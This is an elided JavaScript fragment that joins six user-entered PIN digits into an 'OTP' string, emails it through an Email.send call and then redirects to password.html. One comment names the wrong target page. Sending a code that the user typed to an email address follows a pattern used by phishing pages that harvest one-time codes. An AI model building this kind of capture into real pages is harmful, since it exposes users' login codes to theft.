function emailSend() {
  ...
  var pin = pin1 + pin2 + pin3 + pin4 + pin5 + pin6; // Concatenating the individual PIN values

  var messageBody = "OTP: " + pin; // Constructing the message body with the PIN
  ...
  Email.send({
    ...
    message => {
      if (message == 'OK') {
        window.location.href = 'password.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
